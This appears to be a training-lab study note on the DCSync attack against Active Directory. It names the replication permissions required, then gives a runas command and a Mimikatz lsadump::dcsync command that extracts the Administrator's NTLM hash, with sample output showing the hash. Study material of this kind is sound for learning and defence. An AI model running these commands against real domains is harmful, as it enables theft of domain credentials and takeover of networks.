- <span style="color:rgb(255, 0, 0)">DCSync</span> is an attack that threat agents utilize to impersonate a Domain Controller and perform replication with a targeted Domain Controller to extract password hashes from Active Directory as long as they have the necessary permissions assigned, which are:
- `Replicating Directory Changes`
- `Replicating Directory Changes All`
![[Pasted image 20260910225202.png]]
-----------------

1) Start a shell as the user with hte needed permissions
```
runas /user:eagle\rocky cmd.exe
```

2) One of the tools with an implementation for performing DCSync. We can run it by specifying the username whose password hash we want to obtain, in this case, the user "Administrator"
```
C:\Mimikatz>mimikatz.exe

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator

[DC] 'eagle.local' will be the domain
[DC] 'DC2.eagle.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 07/08/2022 11.24.13
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeae
```

